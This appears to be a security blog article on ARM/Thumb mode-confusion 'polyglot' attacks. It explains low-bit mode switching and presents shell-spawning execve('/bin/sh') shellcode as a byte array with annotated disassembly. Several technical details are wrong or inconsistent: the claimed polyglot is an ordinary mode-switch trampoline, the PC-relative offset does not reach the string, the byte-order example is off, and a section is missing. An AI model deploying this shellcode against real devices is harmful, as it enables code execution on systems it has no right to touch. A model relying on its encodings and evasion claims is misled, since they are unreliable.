# Thumb ARM Polyglot Attack

## Exploiting Instruction Set Architecture Confusion for Stealthy Code Injection

### 1. Introduction
ARM processors dominate the embedded systems and mobile device markets, powering billions of smartphones, IoT devices, and embedded systems worldwide. A unique characteristic of ARM architecture is its support for two distinct instruction set architectures: the traditional 32-bit ARM instruction set and the more compact 16-bit Thumb instruction set. While this dual-mode capability was designed to optimize code density and performance, it inadvertently creates a novel attack surface that has received limited attention in the security research community.

The fundamental security issue arises from the fact that the same sequence of bytes can represent entirely different instructions depending on the processor's execution mode. An attacker can craft carefully designed bytecode that appears innocuous when analyzed in ARM mode but executes malicious operations when the processor switches to Thumb mode. This technique, known as ARM/Thumb polyglot code injection, enables attackers to evade static analysis tools, bypass security scanners, and execute arbitrary code with stealth.


### 2. Background: ARM and Thumb Instruction Sets

#### 2.1 ARM Architecture Overview
ARM (Advanced RISC Machine) is a family of reduced instruction set computing (RISC) architectures widely used in embedded systems, mobile devices, and increasingly in desktop and server environments. The ARM architecture has evolved through multiple versions (ARMv4, ARMv5, ARMv6, ARMv7, ARMv8), with each iteration adding new features while maintaining backward compatibility.
The traditional ARM instruction set uses fixed-length 32-bit instructions and each instruction is exactly 4 bytes.

Key characteristics of ARM mode include:

•	Fixed 32-bit instruction width

•	4-byte instruction alignment requirement

•	Rich instruction set with conditional execution

•	Powerful addressing modes

•	Full access to all processor features

#### 2.2 Thumb Instruction Set
Thumb is a compressed instruction set introduced with ARMv4T to improve code density. Thumb instructions are 16 bits wide, allowing more instructions to fit in the same memory footprint. This is particularly valuable in embedded systems where memory is constrained and code size directly impacts system cost.
Thumb mode achieves approximately 65% of the code size of equivalent ARM code while maintaining similar performance for most applications. However, this compression comes with trade-offs: Thumb instructions have more limited functionality, fewer registers are directly accessible (r0-r7 instead of r0-r15), and conditional execution is restricted.
Thumb instructions are aligned on 2-byte boundaries.

Key characteristics of Thumb mode:

•	16-bit instruction width (32-bit in Thumb-2)

•	2-byte alignment requirement

•	Reduced instruction set

•	Limited register access (r0-r7 primarily)

•	Approximately 35% smaller code size

#### 2.3 The Mode Switching Mechanism
ARM processors can switch between ARM and Thumb modes dynamically during execution. The current execution mode is tracked in the T bit (bit 5) of the Current Program Status Register (CPSR). When T=0, the processor executes in ARM mode; when T=1, it executes in Thumb mode.
Mode switching occurs through specific branch instructions:

•	BX (Branch and Exchange): Branches to an address in a register and switches mode based on LSB

•	BLX (Branch with Link and Exchange): Similar to BX but saves return address in link register

•	Exception returns: Mode can change when returning from interrupts or exceptions

The critical security-relevant aspect is how the target address is interpreted. When executing BX or BLX, the processor examines the least significant bit (LSB) of the target address to determine the new execution mode. This is where the attack surface emerges.

### 4. The LSB Exploitation Mechanism

#### 4.1 LSB as Mode Indicator
The ARM architecture employs an elegant optimization: since instructions must be aligned (4-byte for ARM, 2-byte for Thumb), the least significant bit(s) of any valid instruction address would normally always be zero. Rather than waste this bit, ARM processors repurpose it as a mode indicator when used in branch instructions.
The LSB encoding works as follows:

•	LSB = 0: Target address contains ARM mode instructions

•	LSB = 1: Target address contains Thumb mode instructions

When the processor executes a BX or BLX instruction, it:

1.	Reads the target address from the specified register
   
2.	Examines the LSB to determine the new mode
   
3.	Updates the T bit in CPSR accordingly
   
4.	Masks off the LSB(s) and branches to the aligned address

For example:
Physical address: 0x8000
ARM mode pointer:   0x8000 (LSB = 0)
Thumb mode pointer: 0x8001 (LSB = 1)

#### 4.2 The Security Vulnerability
The security vulnerability arises because the same sequence of bytes can represent completely different instructions depending on the interpretation mode. An attacker can craft a sequence of bytes that:

•	When disassembled as ARM (32-bit) instructions, appears to perform benign operations

•	When executed as Thumb (16-bit) instructions, performs malicious operations

Consider the following byte sequence:

```
Bytes: 0x46 0xC0 0x46 0xC0

ARM interpretation (0x46C046C0):
  strbmi r4, [r0], #-3008

Thumb interpretation:
  0x46C0: mov r8, r8  (NOP-equivalent)
  0x46C0: mov r8, r8  (NOP-equivalent)
```

#### 4.3 Attack Scenarios
Several attack scenarios exploit this confusion.

##### 4.3.1 Static Analysis Evasion
Security scanners and antivirus software typically disassemble binaries to detect malicious code patterns. Most tools default to ARM mode for disassembly. By crafting polyglot code, an attacker can hide malicious Thumb instructions that are invisible to ARM-mode scanners.

##### 4.3.2 Return-Oriented Programming Enhancement
In ROP attacks, attackers chain together existing code fragments (gadgets) to perform malicious operations. ARM/Thumb confusion doubles the available gadget space: every ARM instruction sequence has a corresponding Thumb interpretation, effectively providing two different gadgets at the same memory location.

##### 4.3.3 Sandbox Escape
Sandboxed environments may validate code before execution by disassembling in ARM mode. If the validation logic doesn't account for potential Thumb execution, attackers can inject code that passes ARM validation but executes malicious Thumb instructions.

### 5. Proof of Concept: Shell Spawning Attack

#### 5.1 Attack Overview
We now present a practical proof-of-concept that demonstrates the real-world exploitability of ARM/Thumb polyglot attacks. Our implementation crafts a polyglot bytecode sequence that:

•	Appears benign when disassembled in ARM mode

•	Spawns a shell (/bin/sh) when executed in Thumb mode

•	Uses legitimate syscalls without requiring code injection

#### 5.2 Technical Implementation
The attack requires careful construction of a byte sequence that satisfies multiple constraints simultaneously. The shellcode must:

• Decode to innocuous ARM instructions

•	Decode to functional Thumb shellcode

• Execute the execve syscall with proper arguments

• Handle the string "/bin/sh" in memory

The following assembly demonstrates the Thumb shellcode that spawns a shell:

```
.thumb
.global _start

_start:
    // Access string data
    adr r0, binsh       // r0 = address of "/bin/sh"
    
    // Setup execve arguments
    mov r1, #0          // r1 = NULL (argv)
    mov r2, #0          // r2 = NULL (envp)
    
    // Load syscall number
    mov r7, #11         // r7 = __NR_execve (11)
    
    // Execute syscall
    svc #1              // syscall

binsh:
    .ascii "/bin/sh\0"

```

This Thumb code uses the Linux execve syscall (number 11) to execute /bin/sh. The adr instruction loads the address of the string into r0, while r1 and r2 are set to NULL for the argv and envp parameters.

#### 5.3 Polyglot Bytecode Construction
The challenge is encoding this Thumb shellcode in a way that appears benign in ARM mode. We achieve this through careful byte selection. Here is the complete polyglot shellcode:

```
// Polyglot ARM/Thumb shellcode
unsigned char shellcode[] = {
    // Bytes that decode differently in each mode
    0x01, 0x30, 0x8f, 0xe2,  // ARM: add r3, pc, #1
                             // Thumb: (part of transition)
    
    0x13, 0xff, 0x2f, 0xe1,  // ARM: bx r3
                             // Switches to Thumb mode
    
    // From here, Thumb shellcode begins
    0x05, 0xa0,              // Thumb: add r0, pc, #20
    0x00, 0x21,              // Thumb: movs r1, #0
    0x00, 0x22,              // Thumb: movs r2, #0
    0x0b, 0x27,              // Thumb: movs r7, #11
    0x01, 0xdf,              // Thumb: svc #1
    
    // String data
    0x2f, 0x62, 0x69, 0x6e,  // "/bin"
    0x2f, 0x73, 0x68, 0x00   // "/sh\0"
};
```

#### 5.4 Execution Analysis
Let's analyze how this code behaves in each mode:

```
ARM Mode Interpretation (appears benign)
0x00: e28f3001    add r3, pc, #1     // Harmless arithmetic
0x04: e12fff13    bx r3              // Branch with exchange
0x08: ...         (data/garbage)
```
When disassembled as ARM code, this appears to be simple arithmetic followed by a branch. A static analyzer would see nothing suspicious.

However, when execution reaches this code with the LSB set (Thumb mode), the processor interprets the bytes differently:
The initial ARM instructions set up the transition:

  - 'add r3, pc, #1' sets r3 to PC+1 (LSB=1)
    
  - 'bx r3' branches to the next instruction in Thumb mode

Now executing in Thumb mode:

```
0x08: a005        add r0, pc, #20    // r0 -> "/bin/sh"
0x0a: 2100        movs r1, #0        // argv = NULL
0x0c: 2200        movs r2, #0        // envp = NULL
0x0e: 270b        movs r7, #11       // syscall number
0x10: df01        svc #1             // execute syscall
```

### 6. Detection - Static Analysis
Static analysis tools typically disassemble code in a single mode (usually ARM). They cannot automatically detect that the same bytes have a different, malicious interpretation in Thumb mode. To properly detect polyglot attacks, a disassembler would need to:

•	Disassemble every code region in both ARM and Thumb modes

•	Track all possible mode-switching points

•	Analyze both interpretations for suspicious patterns

•	Maintain control flow graphs for both modes simultaneously

### 7. We see you soon...
Stay hack, stay protected!




